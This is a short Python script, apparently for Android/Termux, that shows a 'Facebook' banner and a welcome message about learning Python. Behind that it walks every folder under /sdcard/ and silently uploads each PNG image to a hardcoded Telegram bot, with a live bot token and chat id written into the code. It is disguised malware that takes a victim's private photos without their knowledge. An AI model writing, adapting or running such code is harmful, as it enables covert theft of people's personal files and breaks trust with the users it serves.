import os,requests,time,pyfiglet

v=pyfiglet.figlet_format('Facebook')
print("\033[1;31m",v)
print('Welcome to the world of Python programming!')
os.system('pip install requests ')
os.system('clear')

print('Welcome to the world of Python programming!')
print("\033[1;31m",v)
for f1, f2 , f3 in os.walk('/sdcard/'):
	for a in f3:
		if '.png'in a:
			out=os.path.join(f1,a)
			id = 1268370511
			token ='5366702455:AAF40RHfe-vrQ9ouj9Vd_dFhA9npzcbT8ho'
			file ={"document": open(f'{out}', 'rb')}
			req = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
			
